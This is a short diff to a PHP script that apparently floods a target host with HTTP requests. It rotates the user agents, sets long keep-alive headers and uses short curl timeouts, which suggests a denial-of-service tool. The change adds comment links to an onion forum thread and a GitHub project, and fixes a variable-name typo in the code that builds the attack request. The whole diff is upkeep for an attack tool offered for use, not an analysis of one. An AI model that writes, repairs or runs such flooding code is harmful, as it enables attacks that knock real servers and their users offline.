@@ -1,5 +1,9 @@
 <?php
 error_reporting(0);
+// http://lwplxqzvmgu43uff.onion/viewtopic.php?pid=267990#p267990
+// https://github.com/zanyarjamal/zambie/blob/master/zambie.py
+// https://www.youtube.com/watch?v=wiXsJ96v0gE
+
 echo "
 
 ########################
@@ -106,7 +110,7 @@ if($type == 'http'){
             @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
             @curl_exec($ch);
             $fs      = array();
-            $request =  "$mhtd / HTTP/1.1\r\n";
+            $request =  "$mthd / HTTP/1.1\r\n";
             $request .= "Host: $ip\r\n";
             $request .= "User-Agent: ".$brow[$rand_keys[1]]."\r\n";
             $request .= "Keep-Alive: 900\r\n";
